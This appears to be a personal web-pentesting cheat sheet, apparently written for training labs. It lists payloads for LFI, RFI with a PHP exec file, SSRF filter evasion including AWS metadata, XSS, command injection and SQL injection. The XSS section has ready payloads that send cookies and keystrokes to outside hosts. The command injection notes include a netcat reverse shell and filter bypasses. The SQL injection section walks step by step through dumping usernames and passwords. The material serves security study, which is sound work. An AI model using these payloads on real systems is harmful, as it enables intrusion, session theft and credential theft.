# Useful Programs

- ffuf/GoBuster/Dirb: Recursively request HTTP endpoints with different sub-pages or form values
- BurpSuite: HTTP(S) request related exploits
- RequestBin.com: Monitor HTTP requests on a site

# Command Syntaxes

## Curl

```bash
curl
  -X METHOD
  -F "FORM=DATA"
  -H "Content-Type: TYPE"
  -D "{JSON:DATA}"
  --url "URL"
```

## ffuf
```bash
ffuf
  -w WORDLIST
  -u https://example.com/FUZZ
  -X METHOD
  -d "json=FUZZ"
  -H "Content-Type: TYPE"
  -H "Cookie: name=value"
  -mr "match regex for valid"
  -fc FILTER_OUT_STATUS_CODE
```

## dirb
```bash
dirb
  https://example.com/ WORDLIST
```

## gobuster
```bash
gobuster
  dir 
  --url https://example.com/ 
  -w WORDLIST
```

## Netcat
```bash
  nc
    -l # Listen Mode
    -n # No DNS Lookup
    -v # Verbose
    -p PORT
```

# Discovery Methods

## Manual
- `robots.txt`: Contains directories not cached by search engines
- `favicon`: Could contain leftover framework build icon [https://wiki.owasp.org/index.php/OWASP_favicon_database]
- `sitemap.xml`: Contains all directories to be cached by search engines

## Google Dorking
- `site:example.com`
- `inurl:admin`
- `filetype:pdf`
- `intitle:admin`

## Wappalyzer
- [Wappalyzer](https://www.wappalyzer.com/): Automatically finds site frameworks, platforms, and libraries

## Automated
- See "Useful Programs"

# Attacks
## Insecure Direct Object Reference (IDOR)
Insecure Direct Object Reference - Changing parameter inputs to effect the returned value
### Vulnerabilities and Exploits
- [example.com/profile?user_id=100](https://example.com/profile?user_id=100)
  - **Exploit:** [example.com/profile?user_id=1](https://example.com/profile?user_id=1)
### Notes
- Could be encrypted in MD5, Base64, and other hashes

## LFI (Local File Inclusion)
Local File Inclusion - Accessing files in a PHP file server outside of the intended directory
- `/index.php?file=/etc/passwd` - Traditional
- `/index.php?file=../../etc/passwd` - Directory Based
- `/index.php?file=SubFolder/../../etc/passwd` - Sub-Folder Based
- `/index.php?file=../../etc/passwd0x00` - Null Byte 1
- `/index.php?file=../../etc/passwd%00` - Null Byte 2
- `/index.php?file=....//....//etc//passwd` - Filtered
### Tips
- Try switching request methods

## RFI (Remote File Inclusion)
Remote File Inclusion - Runs PHP file from remote server [RCE]
- (Host PHP at [http://example.com/payload.txt](http://example.com/payload.txt))
  - `/index.php?file=http://example.com/payload.txt`
### Quick Payload Hosting
```bash
echo "<?php
print exec('hostname');
?>" > payload.txt
python3 -m http.server
# Replace 0.0.0.0 with public IP
```

## SSRF (Server-Side Request Forgery)
Server-Side Request Forgery - Change request URLs to access different data or steal hidden headers
### Vulnerabilities and Exploits
- https://example.com/form?server=http://api.example.com/req - Link
  - Exploit - https://example.com/form?server=http://api.example.com/admin
  - Requests - http://api.example.com/admin
- https://example.com/form?server=api - Subdomain
  - Exploit - https://example.com/form?server=api.example.com/admin?
  - Requests - http://api.example.com/admin?https://example.com/form
- https://example.com/member?path=/req - Path
  - Exploit - https://example.com/member?path=/../admin
  - Requests - http://api.example.com/admin
### Defense Evasion
- Domain rewrites
  - [Rule denies if using a blocked subdomain (admin.example.com)]
  - localhost
  - 0.0.0.0
  - 127.0.0.1
  - 127.0.0.1.nip.io
- Fake Domain
  - [Rule only accepts if domain starts with example.com]
  - Host enemy API on example.com.yourdomain.com
- Open Redirect
  - [Rule only accepts if domain starts with example.com]
  - [https://example.com/link?url=https://anything.com redirects to https://anything.com]
  - Host enemy API at anything.com
- Sub-Directories
  - [Rule denies if page starts with /admin]
  - Request "/x/../admin"
### Notes
- 169.254.169.254 - Contains Metadata on AWS Machines

## XSS (Cross-Site Scripting)
Cross-Site Scripting - JavaScript code injected into site to be ran by other users
### Vulnerabilities and Exploits
***
#### Reflected
URL Query that is not validated and injected straight to HTML
URL - `https://example.com/page?error=Invalid Input Detected`

Code:
```
<div class="alert alert-danger">
    <p>Invalid Input Detected</p>
<div>
```

Exploit: `https://example.com/page?error=<script src="https://attacker.com/payload.js"></script>`

Code:
```
<div class="alert alert-danger">
    <p><script src="https://attacker.com/payload.js"></script></p>
<div>
```
***
#### Stored
Saved data that is stored in a database and added to HTML
- Users to post comments
- Profile information
- Bios
- Website listings
***
#### document.write based DOM
Vulnerability - `document.write("<p>" + parameter + "</p>")`

Exploit - `<script>alert("XSS Detected!")</script>`
***
#### No script based DOM

Vulnerability - `element.innerHTML="<p>" + parameter + "</p>`

Exploit - `<img src=1 onerror=alert("XSS Detected!")>`
***
#### String escape DOM
- Close the string, run the payload, then escape the original closing string
Vulnerability - `element.innerHTML='parameter'`

Exploit - `';alert("XSS Detected");//`
***
#### eval based DOM
Vulnerability - `eval(var data = parameter)`

Exploit - `<script>alert(\'XSS Detected!\')</script>`
***
#### Image Error Based DOM
Vulnerability - `<img src="parameter">`

Exploit - `x" onload="alert('XSS Detected!')`
***
#### Image Load Based DOM
Vulnerability - `<img src="parameter">`

Exploit - `/images/valid.png" onload="alert('XSS Detected!')`
***
#### Blind XSS
- Contact form to staff member
  - Could reveal portal URL, cookies, etc
### Example Payloads
- `<script>alert('XSS');</script>` - Proof Of Concept to show XSS attack worked
- `<script>fetch('https://example.com/steal?cookie=' + btoa(document.cookie));</script>` - Steal user cookie and send it to API
- `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>` - Keylog and send to API
- `<script>user.changeEmail('attacker@example.com');</script>` - Call site function to change users email

## Command Injection
A type of RCE that will execute Linux commands under the same user as the program
### Vulnerabilities and Exploits
#### PHP
Code:
```
$command = "grep param /var/www/html/file.txt";
exec($command);
```

Vulnerability - `param="" /etc/passwd`

#### Python
Code: 
```
subprocess.Popen(f"cat /var/www/html/{param}", shell=True, stdout=subproccess.PIPE).stdout.read()
```

Vulnerability - `param=../../../etc/passwd`

### Bypassing Filters
  - `"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" = "/etc/passwd"` - Hexadecimal escaped characters
  - `"nnetcatetcat" = "netcat"` - Replacement bypassing

### Linux Payloads
- `whoami` - Displays the user the application is running under
- `ls` - Finds files in current directory, used to find config files, source code, env files, etc
- `ping` - Hangs the application until ping is complete to detect a Blind RCE
- `sleep` - Hangs application to detect Blind RCE
- `nc` - Spawn a reverse shell to allow further commands to be run

### Windows Payloads
- `whoami` - Displays the user the application is running under
- `dir` - Finds files in current directory, used to find config files, source code, env files, etc
- `ping` - Hangs the application until ping is complete to detect a Blind RCE
- `timeout` - Hangs application to detect Blind RCE

### Notes
- If adding parameter to a command, use `|` or `;` to create a new command

## SQLi
SQL Injection - Exploits that allow users to modify or read from an SQL Database

### Vulnerabilities and Exploits
- `SELECT * from blog where id=param and private=0 LIMIT 1;`
    - Exploit - `https://example.com/page?param=1;--`
    - Command - `SELECT * from blog where id=1;-- and private=0 LIMIT 1;`

### In-Band SQLi Process
- `https://example.com/page?param=1 UNION SELECT 1;--` - Find amount of columns
- `https://example.com/page?param=1 UNION SELECT 1,2;--` - Add more until error goes away
- `https://example.com/page?param=0 UNION SELECT 1,2,3;--` - Make first query return nothing so SQL data is returned
- `https://example.com/page?param=0 UNION SELECT 1,2,database();--` - Find name of database
- `https://example.com/page?param=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = NAME;--` - Find table names
- `https://example.com/page?param=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = TABLE_NAME;--` - Find columns
- `https://example.com/page?param=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM TABLE_NAME;--` - Return data from columns

### Blind SQLi Authentication Bypass
- `select * from users where username='' and password='' OR 1=1;`

### Boolean Blind SQLi Process
Find exploit to return 2 different values depending on error

- `https://website.thm/checkuser?username=admin` - Returns taken:true
- `https://website.thm/checkuser?username=admin123` - Returns taken:false
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1;--` - Returns taken:false meaning there is an error
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2;--` - Add more until error goes away
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3;--` - Returns taken:true. Correct amount of columns
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'a%';--` - Returns taken:false. Database name does not start with 'a'
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like NAME;--` - Bruteforce letters until entire database name uncovered
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE TABLE_SCHEMA=NAME and table_name like 'a%';--` - Returns taken:false. Table name(s) do not start with 'a'
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE TABLE_SCHEMA=NAME and table_name like TABLE_NAME;--` - Bruteforce letters until entire table name uncovered
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=NAME and table_name like TABLE_NAME and column_name like 'a%';--` - Returns taken:false. column name(s) do not start with 'a'
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=NAME and table_name like TABLE_NAME and column_name like COLUMN_NAME1;--` - Bruteforce letters until entire column name uncovered
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=NAME and table_name like TABLE_NAME and column_name like 'a%' and column_name != COLUMN_NAME1;--` - Returns taken:false. column name(s) do not start with 'a'
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=NAME and table_name like TABLE_NAME and column_name like COLUMN_NAME2 and column_name != COLUMN_NAME1;--` - Bruteforce letters until entire column name uncovered
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM TABLE_NAME where COLUMN_NAME1 like 'a%';--` - Returns taken:true. some data starts with 'a'
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM TABLE_NAME where COLUMN_NAME1 like DATA1 and COLUMN_NAME2 like 'a%';--` - Returns taken:false. no data starts with 'a'
- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM TABLE_NAME where COLUMN_NAME1 like DATA and COLUMN_NAME2 like DATA2;--` - Bruteforce letters until all data revealed

### Time Based Blidn SQLi Process
- Same as Boolean based, but calls to Union Select should start with `UNION SELECT SLEEP(1)`
  - If the time taken to return data is less than 1 second, 0 results matches query
  - If the time taken to return data is ~1 second, 1 result matches query
  - If the time taken to return data is ~X seconds, X results matches query
